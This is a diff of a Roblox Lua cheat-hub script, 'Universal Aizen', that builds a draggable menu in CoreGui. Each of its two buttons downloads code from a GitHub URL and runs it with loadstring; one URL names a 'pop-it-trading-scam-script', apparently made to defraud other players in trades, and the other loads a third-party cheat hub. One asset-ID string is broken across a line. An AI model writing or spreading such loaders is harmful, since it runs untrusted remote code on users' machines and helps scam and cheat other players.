@@ -1,96 +1,132 @@
--- Create UI Screen
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game.CoreGui
+--// Universal Aizen GUI \\--
+if game.CoreGui:FindFirstChild("AizenHub") then
+    game.CoreGui.AizenHub:Destroy()
+end
 
--- Create Main Frame (Resizable & Draggable)
+-- UI Variables
+local AizenUI = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 300, 0, 200) -- Bigger size
-Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Frame.BorderSizePixel = 3
-Frame.Active = true
-Frame.Draggable = true -- Makes it movable
-Frame.Parent = ScreenGui
-
--- Create Title Bar (With Close Button)
+local UICorner = Instance.new("UICorner")
 local TitleBar = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local Logo = Instance.new("ImageLabel")
+local ContentFrame = Instance.new("Frame")
+local UIListLayout = Instance.new("UIListLayout")
+
+-- Parent the UI
+AizenUI.Name = "AizenHub"
+AizenUI.Parent = game.CoreGui
+
+-- Main Frame
+Frame.Size = UDim2.new(0, 350, 0, 250)
+Frame.Position = UDim2.new(0.5, -175, 0.5, -125)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.ClipsDescendants = true
+Frame.Parent = AizenUI
+
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+-- Title Bar
 TitleBar.Size = UDim2.new(1, 0, 0, 40)
 TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 TitleBar.Parent = Frame
 
--- Add Logo
-local Logo = Instance.new("ImageLabel")
-Logo.Size = UDim2.new(0, 30, 0, 30)
-Logo.Position = UDim2.new(0, 5, 0, 5)
-Logo.Image = "rbxassetid://6031071057" -- You can change this ID to another logo
-Logo.Parent = TitleBar
-
--- Title Text
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -40, 1, 0)
-Title.Position = UDim2.new(0, 40, 0, 0)
+Title.Size = UDim2.new(1, -50, 1, 0)
+Title.Position = UDim2.new(0, 50, 0, 0)
 Title.BackgroundTransparency = 1
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Text = "🔵 Universal Aizen"
 Title.Font = Enum.Font.SourceSansBold
-Title.TextSize = 20
+Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = TitleBar
 
--- Close (X) Button
-local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 30, 1, 0)
-CloseButton.Position = UDim2.new(1, -30, 0, 0)
-CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+-- Close Button
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -35, 0.5, -15)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseButton.Text = "X"
-CloseButton.Font = Enum.Font.SourceSansBold
-CloseButton.TextSize = 20
 CloseButton.Parent = TitleBar
 
 CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
+    AizenUI:Destroy()
 end)
 
--- Create Pop It Trading Button
-local PopItButton = Instance.new("TextButton")
-PopItButton.Size = UDim2.new(1, -20, 0, 40)
-PopItButton.Position = UDim2.new(0, 10, 0, 50)
-PopItButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-PopItButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-PopItButton.Text = "🔥 Pop It Trading"
-PopItButton.Font = Enum.Font.SourceSansBold
-PopItButton.TextSize = 18
-PopItButton.Parent = Frame
+-- Logo
+Logo.Size = UDim2.new(0, 40, 0, 40)
+Logo.Position = UDim2.new(0, 5, 0, 0)
+Logo.BackgroundTransparency = 1
+Logo.Image = "rbxassetid://134937676897685
 
-PopItButton.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore"))()
+" -- Replace with your logo ID
+Logo.Parent = TitleBar
+
+-- Content Frame
+ContentFrame.Size = UDim2.new(1, -10, 1, -50)
+ContentFrame.Position = UDim2.new(0, 5, 0, 45)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Parent = Frame
+
+UIListLayout.Parent = ContentFrame
+UIListLayout.Padding = UDim.new(0, 5)
+
+-- Function to Create Buttons
+local function CreateButton(name, color, scriptURL)
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(1, 0, 0, 35)
+    Button.BackgroundColor3 = color
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Text = name
+    Button.Font = Enum.Font.SourceSansBold
+    Button.TextSize = 16
+    Button.Parent = ContentFrame
+
+    Button.MouseButton1Click:Connect(function()
+        local success, response = pcall(game.HttpGet, game, scriptURL)
+        if success then
+            loadstring(response)()
+        else
+            warn("❌ Failed to load " .. name)
+        end
+    end)
+end
+
+-- Add Scripts to the GUI
+CreateButton("🔥 Pop It Trading", Color3.fromRGB(50, 50, 150), "https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore")
+CreateButton("⚽ Blue Lock Rivals", Color3.fromRGB(150, 50, 50), "https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals")
+
+-- UI Dragging Feature
+local UIS = game:GetService("UserInputService")
+local Dragging, DragInput, DragStart, StartPos
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        Dragging = true
+        DragStart = input.Position
+        StartPos = Frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                Dragging = false
+            end
+        end)
+    end
 end)
 
--- Create Blue Lock Rivals Button
-local BlueLockButton = Instance.new("TextButton")
-BlueLockButton.Size = UDim2.new(1, -20, 0, 40)
-BlueLockButton.Position = UDim2.new(0, 10, 0, 100)
-BlueLockButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-BlueLockButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-BlueLockButton.Text = "⚽ Blue Lock Rivals"
-BlueLockButton.Font = Enum.Font.SourceSansBold
-BlueLockButton.TextSize = 18
-BlueLockButton.Parent = Frame
-
-BlueLockButton.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals"))()
+TitleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        DragInput = input
+    end
 end)
 
--- Credit to You
-local CreditLabel = Instance.new("TextLabel")
-CreditLabel.Size = UDim2.new(1, 0, 0, 30)
-CreditLabel.Position = UDim2.new(0, 0, 0, 160)
-CreditLabel.BackgroundTransparency = 1
-CreditLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-CreditLabel.Text = "👑 Created by Kyzin"
-CreditLabel.Font = Enum.Font.SourceSansBold
-CreditLabel.TextSize = 16
-CreditLabel.Parent = Frame
+UIS.InputChanged:Connect(function(input)
+    if input == DragInput and Dragging then
+        local Delta = input.Position - DragStart
+        Frame.Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)
+    end
+end)
 
 print("✅ Universal Aizen Loaded Successfully!")
